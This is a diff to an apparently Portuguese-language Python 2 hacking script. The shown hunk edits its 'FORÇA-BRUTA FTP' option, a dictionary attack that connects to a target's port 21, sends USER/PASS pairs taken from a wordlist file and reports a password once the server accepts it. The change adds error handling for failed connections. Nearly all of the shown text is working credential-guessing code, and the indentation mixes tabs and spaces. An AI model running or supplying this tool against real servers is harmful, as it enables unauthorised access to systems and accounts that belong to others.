@@ -20,7 +20,6 @@ while True:
 	else:
 		os.system("clear");
 
-
 if pedido == 1:
     print "===================="
     print "|  FORÇA-BRUTA FTP |"
@@ -30,21 +29,26 @@ if pedido == 1:
     usuario = raw_input('Digite o Usuario: ')
     file = open("ftpword.txt")
     for linha in file.readlines():
-        print "Tentando com %s:%s "%(usuario,linha)
-    	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    	s.connect((alvo, 21))
-    	s.recv(1024)
-    	s.send("USER "+usuario+"\r\n")
-    	s.recv(1024)
-    	s.send("PASS "+linha+"\r\n")
-    	resultado = s.recv(1024)
-   	s.send("QUIT\r\n")
+        try:
+        	print "Tentando com %s:%s "%(usuario,linha)
+    		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    		s.connect((alvo, 21))
+    		s.recv(1024)
+    		s.send("USER "+usuario+"\r\n")
+    		s.recv(1024)
+    		s.send("PASS "+linha+"\r\n")
+    		resultado = s.recv(1024)
+   		s.send("QUIT\r\n")
 
-    	if re.search("230", resultado):
-    	    print "[+] Senha encontrada: %s"%(linha)
-            break
-    	else:
-    	    print "[-] Sem sucesso [-]\n"
+    		if re.search("230", resultado):
+    	    	    print "[+] Senha encontrada: %s"%(linha)
+            	    break
+    		else:
+    	    	    print "[-] Sem sucesso [-]\n"
+	
+	except socket.error:
+	    print "Não foi possivel conectar"
+	    break
 
 if pedido == 2:
     print "========================"
